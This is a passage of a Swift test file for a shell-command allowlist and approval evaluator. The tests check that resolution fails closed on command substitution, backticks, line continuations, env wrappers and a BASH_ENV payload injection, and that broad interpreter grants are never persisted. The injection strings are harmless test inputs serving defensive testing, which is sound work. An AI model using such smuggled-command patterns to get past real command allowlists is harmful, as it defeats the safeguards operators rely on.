        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo $(/usr/bin/touch /tmp/openclaw-allowlist-test-subst)",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed on quoted command substitution`() {
        let command = ["/bin/sh", "-c", "echo \"ok $(/usr/bin/touch /tmp/openclaw-allowlist-test-quoted-subst)\""]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo \"ok $(/usr/bin/touch /tmp/openclaw-allowlist-test-quoted-subst)\"",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed on line-continued command substitution`() {
        let command = ["/bin/sh", "-c", "echo $\\\n(/usr/bin/touch /tmp/openclaw-allowlist-test-line-cont-subst)"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo $\\\n(/usr/bin/touch /tmp/openclaw-allowlist-test-line-cont-subst)",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed on chained line-continued command substitution`() {
        let command = [
            "/bin/sh",
            "-c",
            "echo ok && $\\\n(/usr/bin/touch /tmp/openclaw-allowlist-test-chained-line-cont-subst)",
        ]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo ok && $\\\n(/usr/bin/touch /tmp/openclaw-allowlist-test-chained-line-cont-subst)",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed on quoted backticks`() {
        let command = ["/bin/sh", "-c", "echo \"ok `/usr/bin/id`\""]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo \"ok `/usr/bin/id`\"",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist matches shared shell parser fixture`() throws {
        let fixtures = try Self.loadShellParserParityCases()
        for fixture in fixtures {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: ["/bin/sh", "-c", fixture.command],
                rawCommand: fixture.command,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])

            #expect(!resolutions.isEmpty == fixture.ok)
            if fixture.ok {
                let executables = resolutions.map { $0.executableName.lowercased() }
                let expected = fixture.executables.map { $0.lowercased() }
                #expect(executables == expected)
            }
        }
    }

    @Test func `resolve matches shared wrapper resolution fixture`() throws {
        let fixtures = try Self.loadWrapperResolutionParityCases()
        for fixture in fixtures {
            let resolution = ExecCommandResolution.resolve(
                command: fixture.argv,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolution?.rawExecutable == fixture.expectedRawExecutable)
        }
    }

    @Test func `resolve keeps env dash wrapper as effective executable`() {
        let resolution = ExecCommandResolution.resolve(
            command: ["/usr/bin/env", "-", "/usr/bin/printf", "ok"],
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolution?.rawExecutable == "/usr/bin/env")
        #expect(resolution?.resolvedPath == "/usr/bin/env")
        #expect(resolution?.executableName == "env")
    }

    @Test func `resolve for allowlist treats plain sh invocation as direct exec`() {
        let command = ["/bin/sh", "./script.sh"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: "/tmp",
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].executableName == "sh")
    }

    @Test func `resolve for allowlist unwraps env shell wrapper chains`() {
        let command = [
            "/usr/bin/env",
            "/bin/sh",
            "-c",
            "echo allowlisted && /usr/bin/touch /tmp/openclaw-allowlist-test",
        ]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 2)
        #expect(resolutions[0].executableName == "echo")
        #expect(resolutions[1].executableName == "touch")
    }

    @Test func `resolve for allowlist unwraps env dispatch wrappers inside shell segments`() {
        let command = ["/bin/sh", "-c", "env /usr/bin/touch /tmp/openclaw-allowlist-test"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "env /usr/bin/touch /tmp/openclaw-allowlist-test",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].resolvedPath == "/usr/bin/touch")
        #expect(resolutions[0].executableName == "touch")
    }

    @Test func `resolve for allowlist preserves env assignments inside shell segments`() {
        let command = ["/bin/sh", "-c", "env FOO=bar /usr/bin/touch /tmp/openclaw-allowlist-test"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "env FOO=bar /usr/bin/touch /tmp/openclaw-allowlist-test",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].resolvedPath == "/usr/bin/env")
        #expect(resolutions[0].executableName == "env")
    }

    @Test func `resolve for allowlist preserves env wrapper with modifiers`() {
        let command = ["/usr/bin/env", "FOO=bar", "/usr/bin/printf", "ok"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].resolvedPath == "/usr/bin/env")
        #expect(resolutions[0].executableName == "env")
    }

    @Test func `approval evaluator resolves shell payload from canonical wrapper text`() async {
        let command = ["/bin/sh", "-c", "/usr/bin/printf ok"]
        let rawCommand = "/bin/sh -c \"/usr/bin/printf ok\""
        let evaluation = await ExecApprovalEvaluator.evaluate(
            command: command,
            rawCommand: rawCommand,
            cwd: nil,
            envOverrides: ["PATH": "/usr/bin:/bin"],
            agentId: nil)

        #expect(evaluation.displayCommand == rawCommand)
        #expect(evaluation.allowlistResolutions.count == 1)
        #expect(evaluation.allowlistResolutions[0].resolvedPath == "/usr/bin/printf")
        #expect(evaluation.allowlistResolutions[0].executableName == "printf")
        #expect(evaluation.boundCommand == ["/usr/bin/printf", "ok"])
    }

    @Test func `approval evaluator keeps login shell requests non-reusable`() async {
        let rawCommand = "/usr/bin/printf safe"
        let evaluation = await ExecApprovalEvaluator.evaluate(
            command: ["/bin/sh", "-lc", rawCommand],
            rawCommand: rawCommand,
            cwd: nil,
            envOverrides: ["PATH": "/usr/bin:/bin"],
            agentId: nil)

        #expect(evaluation.boundCommand == nil)
        #expect(!evaluation.allowlistSatisfied)
        #expect(!evaluation.canPersistAllowAlways)
    }

    @Test func `allow always patterns unwrap env wrapper modifiers to the inner executable`() {
        let patterns = ExecCommandResolution.resolveAllowAlwaysPatterns(
            command: ["/usr/bin/env", "FOO=bar", "/usr/bin/printf", "ok"],
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])

        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
        #expect(patterns.first?.argPattern?.hasPrefix("sha256:argv:") == true)
    }

    @Test func `allow always patterns fail closed for env modified shell wrappers`() {
        let patterns = ExecCommandResolution.resolveAllowAlwaysPatterns(
            command: [
                "/usr/bin/env",
                "BASH_ENV=/tmp/payload.sh",
                "/bin/sh",
                "-lc",
                "/usr/bin/printf ok",
            ],
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"],
            rawCommand: "/usr/bin/printf ok")

        #expect(patterns.isEmpty)
    }

    @Test func `allow always patterns preserve generated sh lc raw payload binding`() {
        let patterns = ExecCommandResolution.resolveAllowAlwaysPatterns(
            command: ["/bin/sh", "-lc", "/usr/bin/printf safe_marker"],
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"],
            rawCommand: "/usr/bin/printf safe_marker")

        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
        #expect(patterns.first?.argPattern == Self.hashedArgPattern(["/usr/bin/printf", "safe_marker"]))
    }

    @Test func `allow always never persists broad interpreter grants`() {
        for executable in [
            "awk", "find", "gawk", "gmake", "gsed", "node", "osascript", "perl", "php",
            "python3.13", "Rscript", "ruby", "sed", "xargs",
        ] {
            let patterns = ExecCommandResolution.resolveAllowAlwaysPatterns(
                command: [executable, "inline-program"],
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(patterns.isEmpty)
        }

        let r2 = ExecCommandResolution(
            rawExecutable: "r2",
            resolvedPath: "/usr/local/bin/r2",
            resolvedRealPath: "/usr/local/bin/r2",
            executableName: "r2",
            cwd: nil,
            argv: ["r2"])
        #expect(!ExecCommandResolution.isInterpreterLikePersistentGrantTarget(r2))
    }

    @Test func `match all requires every segment to match`() {
        let first = ExecCommandResolution(
            rawExecutable: "echo",
            resolvedPath: "/usr/bin/echo",
            executableName: "echo",
            cwd: nil)
        let second = ExecCommandResolution(
            rawExecutable: "/usr/bin/touch",
            resolvedPath: "/usr/bin/touch",
            executableName: "touch",
            cwd: nil)
        let resolutions = [first, second]

        let partial = ExecAllowlistMatcher.matchAll(
            entries: [ExecAllowlistEntry(pattern: "/usr/bin/echo")],
            resolutions: resolutions)
        #expect(partial.isEmpty)

        let caseMismatch = ExecAllowlistMatcher.matchAll(
            entries: [ExecAllowlistEntry(pattern: "/USR/BIN/ECHO"), ExecAllowlistEntry(pattern: "/usr/bin/touch")],
            resolutions: resolutions)
        #expect(caseMismatch.isEmpty)

        let full = ExecAllowlistMatcher.matchAll(
            entries: [ExecAllowlistEntry(pattern: "/usr/bin/echo"), ExecAllowlistEntry(pattern: "/usr/bin/touch")],
            resolutions: resolutions)
        #expect(full.count == 2)
    }
}
